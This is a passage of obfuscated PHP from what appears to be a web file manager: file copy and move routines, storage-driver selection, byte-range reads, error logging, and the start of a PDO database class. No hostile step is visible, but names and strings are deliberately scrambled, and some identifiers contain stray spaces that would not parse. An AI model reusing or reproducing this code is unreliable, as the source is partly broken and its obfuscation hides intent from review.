$ÈÄ³‡ƒœ, $_SERVER[¶Ô„œ…¯][625], $æã´ÏÖ); } public static function copyMoveChildren($æÕßÂÕ©, $ªğ±ß€, $µæº’‰ = "\x63\157\x70\171", $öƒ¯—‡¯ = REPEAT_REPLACE) { $§ÊŞè…æ =& $_SERVER[¶Ô„œ…¯]; $Àù½´Í = $æÕßÂÕ©; $àü‹ê…Ì = self::driverMake($æÕßÂÕ©); $ µĞ±¬™ = $àü‹ê…Ì->listPath($æÕßÂÕ©, !0); $ü®æŞÊÓ = array_merge($ µĞ±¬™[$§ÊŞè…æ[86]], $ µĞ±¬™[$§ÊŞè…æ[85]]); foreach ($ü®æŞÊÓ as $‡î€Ì’) { self::copyMoveStart($‡î€Ì’[$§ÊŞè…æ[87]], $ªğ±ß€, $öƒ¯—‡¯, $µæº’‰, !1); } if ($µæº’‰ == $§ÊŞè…æ[625]) { self::remove($Àù½´Í); } } private static function copyMoveStart($ÄŸºÕŒ¹, $¡÷Ù“Ú…, $Ü‹ªÌò, $€¾©Í¹÷, $Áğãµ»É) { $íÍ¢é€ø =& $_SERVER[¶Ô„œ…¯]; $·ì—á²• = array($ÄŸºÕŒ¹, $¡÷Ù“Ú…, $Ü‹ªÌò, $Áğãµ»É); Hook::trigger($íÍ¢é€ø[1235] . $€¾©Í¹÷ . $íÍ¢é€ø[1236], $·ì—á²•); $ô÷­óõ = self::copyMove($ÄŸºÕŒ¹, $¡÷Ù“Ú…, $Ü‹ªÌò, $€¾©Í¹÷, $Áğãµ»É); Hook::trigger($íÍ¢é€ø[1235] . $€¾©Í¹÷ . $íÍ¢é€ø[1238], $·ì—á²•, $ô÷­óõ); return $ô÷­óõ; } public static function saveFile($ù óÍí, $±¼ïÌ……, $â†ê¯¯ù = true) { $çºèæõ =& $_SERVER[¶Ô„œ…¯]; $˜§Â¾¯¸ = self::info($±¼ïÌ……); $éŸŠšó = self::driverMake($ù óÍí); $áù‰¥ = self::driverMake($±¼ïÌ……); $ØàÜŒÈÚ = !1; if ($áù‰¥->pathParse[$çºèæõ[1239]]) { $ØàÜŒÈÚ = $áù‰¥; $û·íõÒ = $áù‰¥->pathParse[$çºèæõ[1239]]; $áù‰¥ = self::driverMake($û·íõÒ); } if ($éŸŠšó->pathParse[$çºèæõ[1239]]) { $ê¤úµœ¢ = $éŸŠšó->pathParse[$çºèæõ[1239]]; $éŸŠšó = self::driverMake($ê¤úµœ¢); } $£ÏœÓˆ = $áù‰¥->pathFather($±¼ïÌ……); $åĞ¡¬€¤ = !0; if (!$â†ê¯¯ù && self::driverIsSame($éŸŠšó, $áù‰¥)) { $åĞ¡¬€¤ = !1; } $² ¨¸­¿ = self::copyFile($éŸŠšó, $ù óÍí, $áù‰¥, $£ÏœÓˆ, $˜§Â¾¯¸[$çºèæõ[32]], $åĞ¡¬€¤); if ($ØàÜŒÈÚ) { $² ¨¸­¿ = $ØàÜŒÈÚ->getPathOuter($² ¨¸­¿); } return $² ¨¸­¿; } private static function copyMove($‰÷¿ÚÇİ, $ñ—Ë÷ÅŞ, $†øíƒ€è, $…§Ë½ºØ, $ó±ƒ¾Û° = false) { $„ÆÙè…‰ =& $_SERVER[¶Ô„œ…¯]; if (!$‰÷¿ÚÇİ || $‰÷¿ÚÇİ == $„ÆÙè…‰[8] || !$ñ—Ë÷ÅŞ) { return !1; } ignore_timeout(); $×¤¼“§• = self::driverMake($‰÷¿ÚÇİ); $Â–Š´Ğ¯ = self::driverMake($ñ—Ë÷ÅŞ); $á¥•§úÎ = $…§Ë½ºØ == $„ÆÙè…‰[625]; $œáı¾‡ö = !1; if ($Â–Š´Ğ¯->pathParse[$„ÆÙè…‰[1239]]) { $œáı¾‡ö = $Â–Š´Ğ¯; $ñ—Ë÷ÅŞ = $Â–Š´Ğ¯->pathParse[$„ÆÙè…‰[1239]]; $Â–Š´Ğ¯ = self::driverMake($ñ—Ë÷ÅŞ); } if ($×¤¼“§•->pathParse[$„ÆÙè…‰[1239]]) { $‰÷¿ÚÇİ = $×¤¼“§•->pathParse[$„ÆÙè…‰[1239]]; $×¤¼“§• = self::driverMake($‰÷¿ÚÇİ); } self::check($×¤¼“§•, $‰÷¿ÚÇİ, $Â–Š´Ğ¯, $ñ—Ë÷ÅŞ); Hook::trigger($„ÆÙè…‰[1240], $×¤¼“§•, $‰÷¿ÚÇİ, $Â–Š´Ğ¯, $ñ—Ë÷ÅŞ); $ŒÅ¦˜­ = self::driverIsSame($×¤¼“§•, $Â–Š´Ğ¯); if ($ŒÅ¦˜­) { if ($…§Ë½ºØ == $„ÆÙè…‰[625] && !method_exists($Â–Š´Ğ¯, $„ÆÙè…‰[1241]) && trim($ñ—Ë÷ÅŞ, $„ÆÙè…‰[8]) == trim($Â–Š´Ğ¯->pathFather($‰÷¿ÚÇİ), $„ÆÙè…‰[8])) { if ($×¤¼“§•->pathThis($‰÷¿ÚÇİ) != $ó±ƒ¾Û° && !$×¤¼“§•->isOsDriver()) { return $×¤¼“§•->rename($‰÷¿ÚÇİ, $ó±ƒ¾Û°); } return $Â–Š´Ğ¯->getPathOuter($‰÷¿ÚÇİ); } if (method_exists($Â–Š´Ğ¯, $…§Ë½ºØ)) { return $Â–Š´Ğ¯->{$…§Ë½ºØ}($‰÷¿ÚÇİ, $ñ—Ë÷ÅŞ, $†øíƒ€è, $ó±ƒ¾Û°); } } if ($ŒÅ¦˜­ && $…§Ë½ºØ == $„ÆÙè…‰[625] && $Â–Š´Ğ¯->getType() == $„ÆÙè…‰[109]) { $ï™Ô·÷¿ = $Â–Š´Ğ¯->movePath($‰÷¿ÚÇİ, $ñ—Ë÷ÅŞ, $ó±ƒ¾Û°); if ($ï™Ô·÷¿) { return $ï™Ô·÷¿; } } $´‡Æô´ = $×¤¼“§•->isFile($‰÷¿ÚÇİ); if (!$´‡Æô´ && $Â–Š´Ğ¯->getType() == $„ÆÙè…‰[835] && $×¤¼“§•->getType() == $„ÆÙè…‰[109]) { $ï™Ô·÷¿ = $Â–Š´Ğ¯->copyFolderFromIO($×¤¼“§•, $‰÷¿ÚÇİ, $ñ—Ë÷ÅŞ, $†øíƒ€è, $á¥•§úÎ, $ó±ƒ¾Û°); } else { $ï™Ô·÷¿ = self::copyPath($×¤¼“§•, $‰÷¿ÚÇİ, $Â–Š´Ğ¯, $ñ—Ë÷ÅŞ, $†øíƒ€è, $á¥•§úÎ, $´‡Æô´, $ó±ƒ¾Û°); } if ($ï™Ô·÷¿ && $á¥•§úÎ) { $×¤¼“§•->remove($‰÷¿ÚÇİ); } if ($œáı¾‡ö) { $ï™Ô·÷¿ = $œáı¾‡ö->getPathOuter($ï™Ô·÷¿); } return $ï™Ô·÷¿; } private static function check($âÄ¯Á ×, $² ×û¨ï, $¤ö ôÕ“, &$…¢í¦Áá) { $ôäô‹Ÿç =& $_SERVER[¶Ô„œ…¯]; if (self::driverIsSame($âÄ¯Á ×, $¤ö ôÕ“) && $âÄ¯Á ×->isFolder($² ×û¨ï) && $âÄ¯Á ×->isParentOf($² ×û¨ï, $…¢í¦Áá)) { show_json(LNG($ôäô‹Ÿç[1242]), !1); } if (!$âÄ¯Á ×->exist($² ×û¨ï)) { show_json(LNG($ôäô‹Ÿç[108]), !1); } } private static function copyPath($Â¸Æ—ğ‹, $Á°¹ÚûÎ, $õ¶Ü¾¦Ç, $›ñöÙ¢Ê, $öÉ“»ùı, $àÈ¡»¿Í, $ç«§øÜ, $¦¶şóµû = false, $ÉŞ¨¿ = true) { $–êñ­ú¦ =& $_SERVER[¶Ô„œ…¯]; $ôÜŞì–„ = empty($¦¶şóµû) && $¦¶şóµû !== $–êñ­ú¦[230] ? $Â¸Æ—ğ‹->pathThis($Á°¹ÚûÎ) : $¦¶şóµû; if ($öÉ“»ùı) { $«¶ö„È = $õ¶Ü¾¦Ç->fileNameExist($›ñöÙ¢Ê, $ôÜŞì–„); $ïÂ¸“Ù¬ = $ôÜŞì–„; $ôÜŞì–„ = $õ¶Ü¾¦Ç->fileNameAuto($›ñöÙ¢Ê, $ôÜŞì–„, $öÉ“»ùı, !$ç«§øÜ); if (!$«¶ö„È || $ïÂ¸“Ù¬ != $ôÜŞì–„) { $öÉ“»ùı = !1; } if ($ÉŞ¨¿ && !$öÉ“»ùı) { $õ¶Ü¾¦Ç->_data[$–êñ­ú¦[1243]] = !0; } } if ($ç«§øÜ) { return self::copyFile($Â¸Æ—ğ‹, $Á°¹ÚûÎ, $õ¶Ü¾¦Ç, $›ñöÙ¢Ê, $ôÜŞì–„, $àÈ¡»¿Í); } if ($öÉ“»ùı == REPEAT_RENAME_FOLDER) { $öÉ“»ùı = !1; } $²É³¶õ = rtrim($›ñöÙ¢Ê, $–êñ­ú¦[8]) . $–êñ­ú¦[8] . $ôÜŞì–„; $•ÙšÉµ– = $õ¶Ü¾¦Ç->mkdir($õ¶Ü¾¦Ç->getPath($²É³¶õ), $öÉ“»ùı); $›ñöÙ¢Ê = $õ¶Ü¾¦Ç->getPathInner($•ÙšÉµ–); $íù‰î­¨ = $Â¸Æ—ğ‹->listPath($Á°¹ÚûÎ, !0); $íù‰î­¨ = is_array($íù‰î­¨) ? $íù‰î­¨ : array($–êñ­ú¦[86] => array(), $–êñ­ú¦[85] => array()); $ÌˆöĞš = array_merge($íù‰î­¨[$–êñ­ú¦[86]], $íù‰î­¨[$–êñ­ú¦[85]]); foreach ($ÌˆöĞš as $Êş°¢ğ«) { $¼Ì¥ôÚ = $Êş°¢ğ«[$–êñ­ú¦[33]] == $–êñ­ú¦[232]; $Á°¹ÚûÎ = $Â¸Æ—ğ‹->getPathInner($Êş°¢ğ«[$–êñ­ú¦[87]]); $¯¸ğÇ¸ = self::copyPath($Â¸Æ—ğ‹, $Á°¹ÚûÎ, $õ¶Ü¾¦Ç, $›ñöÙ¢Ê, $öÉ“»ùı, $àÈ¡»¿Í, $¼Ì¥ôÚ, !1, !1); if (!$¯¸ğÇ¸) { IO::errorTips($–êñ­ú¦[1244] . $Á°¹ÚûÎ . $–êñ­ú¦[73] . $›ñöÙ¢Ê); } } self::copyMoveKeepInfo($Â¸Æ—ğ‹, $Á°¹ÚûÎ, $•ÙšÉµ–); return $•ÙšÉµ–; } private static function copyFile($Ï¯ÖÄ¶, $“ë¶Ç“š, $õ¿ùÜ£¬, $åÂ°ÅŞ°, $³Û·›‚ç, $É£¥ıÓ÷) { $²¼‘÷³Š =& $_SERVER[¶Ô„œ…¯]; $åÂ°ÅŞ° = $õ¿ùÜ£¬->getPath(rtrim($åÂ°ÅŞ°, $²¼‘÷³Š[8]) . $²¼‘÷³Š[8] . $³Û·›‚ç); $®óíÔÒ© = $²¼‘÷³Š[1245] . time() . rand_string(5); Hook::trigger($²¼‘÷³Š[1246], $Ï¯ÖÄ¶, $“ë¶Ç“š, $õ¿ùÜ£¬, $åÂ°ÅŞ°, $³Û·›‚ç, $®óíÔÒ©); if (self::driverIsSame($Ï¯ÖÄ¶, $õ¿ùÜ£¬)) { if ($É£¥ıÓ÷) { $š‚õÛ´ñ = $õ¿ùÜ£¬->moveFile($“ë¶Ç“š, $åÂ°ÅŞ°); } else { $š‚õÛ´ñ = $õ¿ùÜ£¬->copyFile($“ë¶Ç“š, $åÂ°ÅŞ°); } Hook::trigger($²¼‘÷³Š[1247], $Ï¯ÖÄ¶, $“ë¶Ç“š, $õ¿ùÜ£¬, $åÂ°ÅŞ°, $³Û·›‚ç, $š‚õÛ´ñ); self::copyMoveKeepInfo($Ï¯ÖÄ¶, $“ë¶Ç“š, $š‚õÛ´ñ); return $š‚õÛ´ñ; } $¤íå¹Îï = TEMP_FILES; if ($GLOBALS[$²¼‘÷³Š[6]][$²¼‘÷³Š[92]][$²¼‘÷³Š[875]]) { $¤íå¹Îï = $GLOBALS[$²¼‘÷³Š[6]][$²¼‘÷³Š[92]][$²¼‘÷³Š[875]]; } $¶ãÃùàÛ = $¤íå¹Îï; mk_dir($¶ãÃùàÛ); $´““À´¦ = $¶ãÃùàÛ . $®óíÔÒ©; $à¹ÕÂ™Á = $´““À´¦; $´““À´¦ = $Ï¯ÖÄ¶->download($“ë¶Ç“š, $´““À´¦); $´““À´¦ = $Ï¯ÖÄ¶->iconvApp($´““À´¦); if (substr($´““À´¦, strlen($¤íå¹Îï)) == $¤íå¹Îï) { $É£¥ıÓ÷ = !0; } $š‚õÛ´ñ = $õ¿ùÜ£¬->upload($åÂ°ÅŞ°, $´““À´¦, $É£¥ıÓ÷); self::remove($à¹ÕÂ™Á); Hook::trigger($²¼‘÷³Š[1247], $Ï¯ÖÄ¶, $“ë¶Ç“š, $õ¿ùÜ£¬, $åÂ°ÅŞ°, $³Û·›‚ç, $š‚õÛ´ñ); self::copyMoveKeepInfo($Ï¯ÖÄ¶, $“ë¶Ç“š, $š‚õÛ´ñ); return $š‚õÛ´ñ; } private static function copyMoveKeepInfo($™òèöÚñ, $ğŠ…ú–, $ßóóÏİÁ) { if (!$ßóóÏİÁ) { return; } $ˆ‹®Õ–ß = $™òèöÚñ->info($ğŠ…ú–); if (!is_array($ˆ‹®Õ–ß)) { return; } IO::setModifyTime($ßóóÏİÁ, $ˆ‹®Õ–ß[$_SERVER[¶Ô„œ…¯][88]]); } public static function pathFather($ó¿Ï´™) { $±ãÃóü = IO::init($ó¿Ï´™); $å¿ÎÅŞ¡ = $±ãÃóü->pathFather($±ãÃóü->path); return $±ãÃóü->getPathOuter($å¿ÎÅŞ¡); } public static function fileOut($¨ÅØşÂ€, $±±½€• = false, $óá«Ö¹ = false, $áˆÆá¨ = '') { $îÛÏ—»Ë = self::driverMake($¨ÅØşÂ€); if ($îÛÏ—»Ë->isFileOutServer()) { return $îÛÏ—»Ë->fileOutServer($¨ÅØşÂ€, $±±½€•, $óá«Ö¹, $áˆÆá¨); } return $îÛÏ—»Ë->fileOut($¨ÅØşÂ€, $±±½€•, $óá«Ö¹, $áˆÆá¨); } public static function fileOutImage($¶˜¿½ªó, $È•şÜüı = 250) { $¶ ¦»öÅ = array(250, 600, 1200, 2000, 3000, 5000); for ($—æ şìÒ = 0; $—æ şìÒ < count($¶ ¦»öÅ); $—æ şìÒ++) { if ($—æ şìÒ == 0 && $È•şÜüı <= $¶ ¦»öÅ[$—æ şìÒ]) { $È•şÜüı = $¶ ¦»öÅ[$—æ şìÒ]; break; } else { if ($È•şÜüı > $¶ ¦»öÅ[$—æ şìÒ - 1] && $È•şÜüı <= $¶ ¦»öÅ[$—æ şìÒ]) { $È•şÜüı = $¶ ¦»öÅ[$—æ şìÒ]; break; } else { if ($—æ şìÒ == count($¶ ¦»öÅ) - 1 && $È•şÜüı > $¶ ¦»öÅ[$—æ şìÒ]) { $È•şÜüı = $¶ ¦»öÅ[$—æ şìÒ]; break; } } } } $ûÚêŸØ´ = self::driverMake($¶˜¿½ªó); if ($ûÚêŸØ´->isFileOutServer()) { return $ûÚêŸØ´->fileOutImageServer($¶˜¿½ªó, $È•şÜüı); } return $ûÚêŸØ´->fileOutImage($¶˜¿½ªó, $È•şÜüı); } private static function driverIsSame($À÷Á’‘, $æ½íƒ×½) { $ÔØ¶¥•Ï =& $_SERVER[¶Ô„œ…¯]; $ö–ê¸Æ¸ = $À÷Á’‘->getType(); $óÙş§‘† = $æ½íƒ×½->getType(); if ($ö–ê¸Æ¸ != $óÙş§‘†) { return !1; } if ($ö–ê¸Æ¸ == $ÔØ¶¥•Ï[835]) { return !0; } if ($ö–ê¸Æ¸ == $ÔØ¶¥•Ï[109]) { return !0; } if ($À÷Á’‘->pathDriver == $æ½íƒ×½->pathDriver) { return !0; } return !1; } public static function copyUpdate($ÈªÅ©âÃ, $¿¾ª­‘Ä) { $ÇöÛÌı™ =& $_SERVER[¶Ô„œ…¯]; if (!IO::exist($ÈªÅ©âÃ)) { return !1; } if (!IO::exist($¿¾ª­‘Ä)) { IO::mkdir($¿¾ª­‘Ä); } $ÍòÈ‘Ã = array_to_keyvalue(self::listAllSimple($ÈªÅ©âÃ), $ÇöÛÌı™[87]); $Òı¬˜ğ£ = array_to_keyvalue(self::listAllSimple($¿¾ª­‘Ä), $ÇöÛÌı™[87]); $ç×ñÙüÈ = array(); $úÅÙ§•â = array(); foreach ($ÍòÈ‘Ã as $ÓÃß«Û† => $ãïØ˜²š) { if (isset($Òı¬˜ğ£[$ÓÃß«Û†])) { if ($ãïØ˜²š[$ÇöÛÌı™[78]] == 1) { continue; } if ($Òı¬˜ğ£[$ÓÃß«Û†][$ÇöÛÌı™[79]] == $ãïØ˜²š[$ÇöÛÌı™[79]]) { continue; } } if ($ãïØ˜²š[$ÇöÛÌı™[78]] == 1) { $úÅÙ§•â[] = $¿¾ª­‘Ä . $ÇöÛÌı™[8] . trim($ÓÃß«Û†, $ÇöÛÌı™[8]); continue; } $¶Âİ™¶¾ = strstr(trim($ÓÃß«Û†, $ÇöÛÌı™[8]), $ÇöÛÌı™[8]) ? get_path_father($ÓÃß«Û†) : $ÇöÛÌı™[12]; $ç×ñÙüÈ[] = array($ÇöÛÌı™[1248] => $ãïØ˜²š[$ÇöÛÌı™[89]], $ÇöÛÌı™[1249] => rtrim($¿¾ª­‘Ä, $ÇöÛÌı™[8]) . $ÇöÛÌı™[8] . $¶Âİ™¶¾, $ÇöÛÌı™[1250] => $ãïØ˜²š); } $ñÓÉÛÅê = array($ÇöÛÌı™[232] => $ç×ñÙüÈ, $ÇöÛÌı™[78] => $úÅÙ§•â); Hook::trigger($ÇöÛÌı™[1251], $ÈªÅ©âÃ, $¿¾ª­‘Ä, $ñÓÉÛÅê); foreach ($úÅÙ§•â as $ãïØ˜²š) { IO::mkdir($ãïØ˜²š); } foreach ($ç×ñÙüÈ as $ãïØ˜²š) { IO::copy($ãïØ˜²š[$ÇöÛÌı™[1248]], $ãïØ˜²š[$ÇöÛÌı™[1249]], REPEAT_REPLACE); } } public static function fileSubstr($µ‰«ïëü, $å´ÊˆÆ, $Ü”Û†²å = false) { $½Ú‡ÉåÈ =& $_SERVER[¶Ô„œ…¯]; $šë€Á¾· = self::driverMake($µ‰«ïëü); $Ï¬»†ë© = $šë€Á¾·->size($µ‰«ïëü); $ŠÕ™ÒÎé = $å´ÊˆÆ; $ã©ÆÎ„ = $Ü”Û†²å; if ($å´ÊˆÆ < 0) { $å´ÊˆÆ = $Ï¬»†ë© + $å´ÊˆÆ; } if ($Ü”Û†²å === !1) { $Ü”Û†²å = $Ï¬»†ë© - $å´ÊˆÆ; } if ($å´ÊˆÆ + $Ü”Û†²å > $Ï¬»†ë©) { $Ü”Û†²å = $Ï¬»†ë© - $å´ÊˆÆ; } if (!$Ï¬»†ë© && $šë€Á¾·->getType() == $½Ú‡ÉåÈ[109] && !$šë€Á¾·->exist($µ‰«ïëü)) { $¯¥ğ¥ªá = get_path_this($µ‰«ïëü); $É£İ¸¶† = parse_url_query($¯¥ğ¥ªá); if (is_array($É£İ¸¶†) && isset($É£İ¸¶†[$½Ú‡ÉåÈ[32]])) { $¯¥ğ¥ªá = urldecode($É£İ¸¶†[$½Ú‡ÉåÈ[32]]); } throw new Exception($½Ú‡ÉåÈ[1252] . LNG($½Ú‡ÉåÈ[1253]) . $½Ú‡ÉåÈ[1050] . clear_html($¯¥ğ¥ªá) . $½Ú‡ÉåÈ[12]); } if ($Ü”Û†²å <= 0) { return $½Ú‡ÉåÈ[12]; } if ($å´ÊˆÆ < 0 || $å´ÊˆÆ >= $Ï¬»†ë© || $Ü”Û†²å > 1024 * 1024 * 10) { throw new Exception("\x66\151\154\145\x52\145\x61\x64\x20\x65\162\x72\157\x72\41\x20\163\x74\x61\x72\164\75{$å´ÊˆÆ}\x3b\x6c\145\x6e\147\164\150\x3d{$Ü”Û†²å}\73\x20\163\151\x7a\145\x3d{$Ï¬»†ë©}\x3b"); } $Æğàûî¼ = $šë€Á¾·->fileSubstr($µ‰«ïëü, $å´ÊˆÆ, $Ü”Û†²å); if (!$Æğàûî¼ && $Ü”Û†²å && isset($GLOBALS[$½Ú‡ÉåÈ[1254]])) { throw new Exception($GLOBALS[$½Ú‡ÉåÈ[1254]][$½Ú‡ÉåÈ[1255]]); } return $Æğàûî¼; } private static function driverMake(&$ß”ÏšõÎ) { $®Ú¶Š€ë =& $_SERVER[¶Ô„œ…¯]; $õ˜şÍ»Î = KodIO::parse($ß”ÏšõÎ); if (!self::$driverListSystem) { $¶ïƒù¶Œ = Model($®Ú¶Š€ë[845])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($¶ïƒù¶Œ, $®Ú¶Š€ë[477]); } if ($õ˜şÍ»Î[$®Ú¶Š€ë[33]] == KodIO::KOD_IO && !self::$driverListSystem[$õ˜şÍ»Î[$®Ú¶Š€ë[477]]]) { throw new Exception($®Ú¶Š€ë[1256]); return !1; } $ß”ÏšõÎ = $õ˜şÍ»Î[$®Ú¶Š€ë[1257]]; $Ñì½èèÙ = self::driverGet($õ˜şÍ»Î, $ß”ÏšõÎ); return $Ñì½èèÙ; } private static function driverGet($áü«Á¿ñ, &$ÊÌÂôÛ) { $¥ÃÄÔÍ =& $_SERVER[¶Ô„œ…¯]; $šáŞáë„ = $áü«Á¿ñ[$¥ÃÄÔÍ[1258]]; $ÒöÒØ¼Ó = $áü«Á¿ñ[$¥ÃÄÔÍ[477]]; switch ($áü«Á¿ñ[$¥ÃÄÔÍ[33]]) { case KodIO::KOD_IO: $İ¸²ìçÒ = self::$driverListSystem[$ÒöÒØ¼Ó]; break; case KodIO::KOD_SOURCE: $ÊÌÂôÛ = $ÒöÒØ¼Ó . $ÊÌÂôÛ; $İ¸²ìçÒ = array($¥ÃÄÔÍ[1259] => $¥ÃÄÔÍ[1260], $¥ÃÄÔÍ[6] => $áü«Á¿ñ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¨“²«şÔ = $GLOBALS[$¥ÃÄÔÍ[1261]]; self::$driverListUser = array_to_keyvalue($¨“²«şÔ, $¥ÃÄÔÍ[477]); } $İ¸²ìçÒ = self::$driverListUser[$ÒöÒØ¼Ó]; break; case KodIO::KOD_SHARE_LINK: $İ¸²ìçÒ = array($¥ÃÄÔÍ[1259] => $¥ÃÄÔÍ[1262], $¥ÃÄÔÍ[6] => $áü«Á¿ñ); $Ş¹—ò˜” = Action($¥ÃÄÔÍ[1263])->sharePathInfo($áü«Á¿ñ[$¥ÃÄÔÍ[87]]); $ÊÌÂôÛ = $Ş¹—ò˜”[$¥ÃÄÔÍ[193]]; if (!$Ş¹—ò˜”[$¥ÃÄÔÍ[193]]) { $¢òğäğ† = Model($¥ÃÄÔÍ[669])->getInfo($Ş¹—ò˜”[$¥ÃÄÔÍ[670]]); $ÊÌÂôÛ = KodIO::clear($¢òğäğ†[$¥ÃÄÔÍ[1264]] . $áü«Á¿ñ[$¥ÃÄÔÍ[1257]]); $áü«Á¿ñ[$¥ÃÄÔÍ[562]] = $¢òğäğ†; $áü«Á¿ñ[$¥ÃÄÔÍ[1239]] = $ÊÌÂôÛ; $İ¸²ìçÒ = array($¥ÃÄÔÍ[1259] => $¥ÃÄÔÍ[1265], $¥ÃÄÔÍ[6] => $áü«Á¿ñ); } break; case KodIO::KOD_SHARE_ITEM: $İ¸²ìçÒ = array($¥ÃÄÔÍ[1259] => $¥ÃÄÔÍ[1266], $¥ÃÄÔÍ[6] => $áü«Á¿ñ); $¢òğäğ† = Model($¥ÃÄÔÍ[669])->getInfo($áü«Á¿ñ[$¥ÃÄÔÍ[477]]); if ($¢òğäğ†[$¥ÃÄÔÍ[193]] == $¥ÃÄÔÍ[230]) { $ÊÌÂôÛ = KodIO::clear($¢òğäğ†[$¥ÃÄÔÍ[1264]] . $áü«Á¿ñ[$¥ÃÄÔÍ[1257]]); $áü«Á¿ñ[$¥ÃÄÔÍ[562]] = $¢òğäğ†; $áü«Á¿ñ[$¥ÃÄÔÍ[1239]] = $ÊÌÂôÛ; $İ¸²ìçÒ = array($¥ÃÄÔÍ[1259] => $¥ÃÄÔÍ[1267], $¥ÃÄÔÍ[6] => $áü«Á¿ñ); } else { if (!$ÊÌÂôÛ) { $ÊÌÂôÛ = $¢òğäğ†[$¥ÃÄÔÍ[193]]; } } break; default: $ÊÌÂôÛ = $áü«Á¿ñ[$¥ÃÄÔÍ[87]]; $İ¸²ìçÒ = array($¥ÃÄÔÍ[1259] => $¥ÃÄÔÍ[1268]); break; } $³¦¦ê´ = $áü«Á¿ñ[$¥ÃÄÔÍ[87]]; if (!isset(self::$driverCache[$³¦¦ê´])) { $Î‘ìñ„½ = strtolower($İ¸²ìçÒ[$¥ÃÄÔÍ[98]]); $¡É´µ¨­ = $GLOBALS[$¥ÃÄÔÍ[6]][$¥ÃÄÔÍ[92]][$¥ÃÄÔÍ[904]]; $ù¨Ø‰®« = $¥ÃÄÔÍ[77] . (isset($¡É´µ¨­[$Î‘ìñ„½]) ? $¡É´µ¨­[$Î‘ìñ„½] : ucfirst($Î‘ìñ„½)); if (!class_exists($ù¨Ø‰®«)) { show_json("{$ù¨Ø‰®«}\40\x6e\157\x74\40\145\170\151\163\164\163\41", !1); } $Çó¿¶Ç° = isset($İ¸²ìçÒ[$¥ÃÄÔÍ[6]]) ? $İ¸²ìçÒ[$¥ÃÄÔÍ[6]] : !1; self::$driverCache[$³¦¦ê´] = new $ù¨Ø‰®«($Çó¿¶Ç°); } $Š–íÇ† = self::$driverCache[$³¦¦ê´]; $Š–íÇ†->pathDriver = $šáŞáë„; $Š–íÇ†->pathBase = $¥ÃÄÔÍ[12]; if (isset($İ¸²ìçÒ[$¥ÃÄÔÍ[6]][$¥ÃÄÔÍ[1269]])) { $Š–íÇ†->pathBase = rtrim($İ¸²ìçÒ[$¥ÃÄÔÍ[6]][$¥ÃÄÔÍ[1269]], $¥ÃÄÔÍ[8]) . $¥ÃÄÔÍ[8]; $ÊÌÂôÛ = $Š–íÇ†->pathBase . ltrim($ÊÌÂôÛ, $¥ÃÄÔÍ[8]); } $ÊÌÂôÛ = $Š–íÇ†->getPath($ÊÌÂôÛ); if (isset($áü«Á¿ñ[$¥ÃÄÔÍ[1239]])) { $ÊÌÂôÛ = $áü«Á¿ñ[$¥ÃÄÔÍ[1239]]; } $Š–íÇ†->path = $ÊÌÂôÛ; return $Š–íÇ†; } public static function errorTips($€ïòğéô = false) { $ÀŠıéÁ  =& $_SERVER[¶Ô„œ…¯]; static $”æ•“ìÅ = array(); $¡ĞÇ´æö = 1000; if ($€ïòğéô === -1) { return $”æ•“ìÅ ? $”æ•“ìÅ[count($”æ•“ìÅ) - 1] : $ÀŠıéÁ [12]; } if ($€ïòğéô === !1) { return implode($ÀŠıéÁ [287], $”æ•“ìÅ); } if (count($”æ•“ìÅ) >= $¡ĞÇ´æö) { $”æ•“ìÅ = array_slice($”æ•“ìÅ, $¡ĞÇ´æö * 0.5, $¡ĞÇ´æö); } $”æ•“ìÅ[] = $€ïòğéô; write_log($ÀŠıéÁ [176] . ACTION . $ÀŠıéÁ [1270] . $€ïòğéô, $ÀŠıéÁ [1271]); } public static function getLastError($à×‡ˆ’ë = '') { $ï’Å ùÁ = self::errorTips(-1); return $ï’Å ùÁ ? $ï’Å ùÁ : $à×‡ˆ’ë; } } goto bŠ¥Ñ¡Ÿ‹ˆ; E¡ÓÖÈƒÓİ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ë½Ú­ë = '') { $øüşˆÔ =& $_SERVER[¶Ô„œ…¯]; if (!class_exists($øüşˆÔ[998])) { think_exception(think_lang($øüşˆÔ[14]) . $øüşˆÔ[999]); } if (!empty($ë½Ú­ë)) { $this->config = $ë½Ú­ë; if (empty($this->config[$øüşˆÔ[17]])) { $this->config[$øüşˆÔ[17]] = array(); } } } public function connect($¹Š¼“¸Ÿ = '', $¿‹å˜¤ı = 0) { $õ¹¿Ôª =& $_SERVER[¶Ô„œ…¯]; if (!isset($this->linkID[$¿‹å˜¤ı])) { if (empty($¹Š¼“¸Ÿ)) { $¹Š¼“¸Ÿ = $this->config; } $òô á· = !empty($¹Š¼“¸Ÿ[$õ¹¿Ôª[17]][$õ¹¿Ôª[18]]) ? $¹Š¼“¸Ÿ[$õ¹¿Ôª[17]][$õ¹¿Ôª[18]] : $this->pconnect; if ($òô á·) { $¹Š¼“¸Ÿ[$õ¹¿Ôª[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¿‹å˜¤ı] = new PDO($¹Š¼“¸Ÿ[$õ¹¿Ôª[1000]], $¹Š¼“¸Ÿ[$õ¹¿Ôª[972]], $¹Š¼“¸Ÿ[$õ¹¿Ôª[973]], $¹Š¼“¸Ÿ[$õ¹¿Ôª[17]]); } catch (PDOException $Ûı‹ë®£) { think_exception($Ûı‹ë®£->getMessage()); } $this->dbType = $this->_getDsnType($¹Š¼“¸Ÿ[$õ¹¿Ôª[1000]]); if (in_array($this->dbType, array($õ¹¿Ôª[1001], $õ¹¿Ôª[1002], $õ¹¿Ôª[1003], $õ¹¿Ôª[1004]))) { think_exception($õ¹¿Ôª[1005] . $this->dbType . $õ¹¿Ôª[1006] . $this->dbType . $õ¹¿Ôª[1007]); } if (!$this->linkID[$¿‹å˜¤ı]) { think_exception($õ¹¿Ôª[1008]); } try { $this->linkID[$¿‹å˜¤ı]->exec($õ¹¿Ôª[1009] . think_config($õ¹¿Ôª[975])); } catch (Exception $Ûı‹ë®£) { } $this->connected = !0; if (1 != think_config($õ¹¿Ôª[22])) { unset($this->config); } } return $this->linkID[$¿‹å˜¤ı]; } public function free() { $this->PDOStatement = null; } public function query($½×Ë§”Æ, $•ØË×û° = array()) { $ÖñÊ¹¿¹ =& $_SERVER[¶Ô„œ…¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $½×Ë§”Æ; if (!empty($•ØË×û°)) { $this->queryStr .= 